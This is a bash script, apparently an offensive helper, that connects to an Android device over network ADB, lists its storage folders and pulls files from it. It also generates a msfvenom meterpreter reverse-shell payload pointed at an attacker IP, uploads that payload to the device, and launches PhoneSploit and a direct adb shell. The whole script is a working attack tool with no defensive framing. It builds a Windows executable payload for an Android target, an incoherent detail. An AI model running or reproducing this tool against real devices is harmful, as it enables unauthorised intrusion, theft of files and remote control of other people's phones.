#!/bin/bash

# ----------- Config & Helpers -----------

LOG_DIR="adb_phonesploit_logs_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$LOG_DIR"

function log_and_echo() {
  echo "$1" | tee -a "$LOG_DIR/session.log"
}

function install_if_missing() {
  local cmd=$1
  local pkg=$2
  if ! command -v "$cmd" &> /dev/null; then
    log_and_echo "[*] $cmd not found. Installing $pkg..."
    sudo apt-get update && sudo apt-get install -y "$pkg" || {
      log_and_echo "[-] Failed to install $pkg. Exiting."
      exit 1
    }
  else
    log_and_echo "[*] $cmd found."
  fi
}

# ----------- Dependencies -----------

install_if_missing adb adb
install_if_missing python3 python3
install_if_missing git git
install_if_missing pip3 python3-pip

# ----------- User Inputs -----------

log_and_echo "=== Android ADB + PhoneSploit Helper v2 ==="

read -rp "Enter Android device IP (e.g. 192.168.1.10): " DEVICE_IP

log_and_echo "[*] Connecting to $DEVICE_IP:5555 ..."
adb connect "$DEVICE_IP:5555" | tee -a "$LOG_DIR/session.log"

if adb devices | grep -q "$DEVICE_IP:5555"; then
  log_and_echo "[+] Connected to $DEVICE_IP"
else
  log_and_echo "[-] Failed to connect to $DEVICE_IP. Exiting."
  exit 1
fi

# ----------- Directory Scan -----------

read -rp "Enter comma-separated directories to scan on device (default: /sdcard/Download,/sdcard/Documents): " DIRS_INPUT
if [[ -z "$DIRS_INPUT" ]]; then
  DIRECTORIES=("/sdcard/Download" "/sdcard/Documents")
else
  IFS=',' read -r -a DIRECTORIES <<< "$DIRS_INPUT"
fi

log_and_echo "[*] Scanning directories on device..."

for dir in "${DIRECTORIES[@]}"; do
  log_and_echo "----- Listing $dir -----"
  adb -s "$DEVICE_IP:5555" shell "ls -l $dir" | tee -a "$LOG_DIR/session.log" || log_and_echo "[!] Could not access $dir"
  log_and_echo ""
done

# ----------- File Pulling -----------

function pull_files() {
  while true; do
    read -rp "Pull a file from device? (y/n): " yn
    case $yn in
      [Yy]* )
        read -rp "Enter full device file path (e.g. /sdcard/Download/secret.txt): " FILE_PATH
        read -rp "Enter local destination directory (default: $LOG_DIR): " LOCAL_DIR
        LOCAL_DIR=${LOCAL_DIR:-$LOG_DIR}
        mkdir -p "$LOCAL_DIR"
        log_and_echo "[*] Pulling $FILE_PATH to $LOCAL_DIR"
        adb -s "$DEVICE_IP:5555" pull "$FILE_PATH" "$LOCAL_DIR" | tee -a "$LOG_DIR/session.log" && log_and_echo "[+] File pulled." || log_and_echo "[-] Failed to pull."
        ;;
      [Nn]* ) break ;;
      * ) echo "Please answer y or n." ;;
    esac
  done
}

pull_files

# ----------- Payload Deployment -----------

read -rp "Do you want to deploy a reverse shell payload? (y/n): " DEPLOY_PAYLOAD
if [[ "$DEPLOY_PAYLOAD" =~ ^[Yy]$ ]]; then
  read -rp "Enter LHOST (your attacker IP): " LHOST
  read -rp "Enter LPORT (your listening port): " LPORT
  read -rp "Enter payload filename (default: revshell.exe): " PAYLOAD_NAME
  PAYLOAD_NAME=${PAYLOAD_NAME:-revshell.exe}

  # Generate payload (windows exe example)
  log_and_echo "[*] Generating Windows reverse shell payload..."
  msfvenom -p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe -o "$PAYLOAD_NAME" | tee -a "$LOG_DIR/session.log"

  log_and_echo "[*] Uploading payload to device /sdcard/Download/"
  adb -s "$DEVICE_IP:5555" push "$PAYLOAD_NAME" /sdcard/Download/ | tee -a "$LOG_DIR/session.log"

  log_and_echo "[*] You can now execute the payload on the device manually."
fi

# ----------- PhoneSploit Setup -----------

log_and_echo "[*] Setting up PhoneSploit..."

if [ ! -d "PhoneSploit" ]; then
  git clone https://github.com/aerosol-can/PhoneSploit.git | tee -a "$LOG_DIR/session.log"
fi

cd PhoneSploit || { log_and_echo "[-] Failed to cd into PhoneSploit directory"; exit 1; }

log_and_echo "[*] Installing PhoneSploit dependencies..."
pip3 install -r requirements.txt | tee -a "../$LOG_DIR/session.log"

log_and_echo "[*] Launching PhoneSploit shell on $DEVICE_IP"
python3 phonesploit.py "$DEVICE_IP"

cd ..

# ----------- Optional Direct Shell -----------

while true; do
  read -rp "Open direct adb shell on device? (y/n): " yn
  case $yn in
    [Yy]* )
      adb -s "$DEVICE_IP:5555" shell
      break
      ;;
    [Nn]* ) break ;;
    * ) echo "Please answer y or n." ;;
  esac
done

log_and_echo "=== Script finished, logs saved in $LOG_DIR ==="
